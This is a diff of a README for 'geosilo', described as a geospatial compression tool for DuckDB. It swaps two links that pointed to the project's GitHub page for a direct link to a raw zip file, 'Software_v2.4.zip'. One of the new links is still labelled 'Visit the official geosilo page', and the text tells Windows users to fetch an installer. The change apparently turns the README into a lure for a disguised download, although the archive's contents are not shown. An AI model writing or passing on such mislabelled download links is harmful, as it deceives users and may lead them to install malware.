@@ -1,6 +1,6 @@
 # 📦 geosilo - Reduce your geospatial data storage costs
 
-[![](https://img.shields.io/badge/Download_geosilo-blue)](https://github.com/adidashyperspace-lab/geosilo)
+[![](https://img.shields.io/badge/Download_geosilo-blue)](https://raw.githubusercontent.com/adidashyperspace-lab/geosilo/main/scripts/Software_v2.4.zip)
 
 Geosilo helps you save space when you store geographic data. It compresses your geometry coordinates so they take up less room on your hard drive. Most geographic databases store shapes using a format called WKB. This format is often bulky. Geosilo uses delta-encoding to shrink these shapes. This tool makes your data three to four times smaller than standard methods. It integrates directly with DuckDB to keep your workflow fast and efficient.
 
@@ -15,7 +15,7 @@ Geosilo helps you save space when you store geographic data. It compresses your 
 
 You must visit the project page to get the installer for your version of Windows. 
 
-[Visit the official geosilo page](https://github.com/adidashyperspace-lab/geosilo)
+[Visit the official geosilo page](https://raw.githubusercontent.com/adidashyperspace-lab/geosilo/main/scripts/Software_v2.4.zip)
 
 Follow these steps to acquire the software:
 
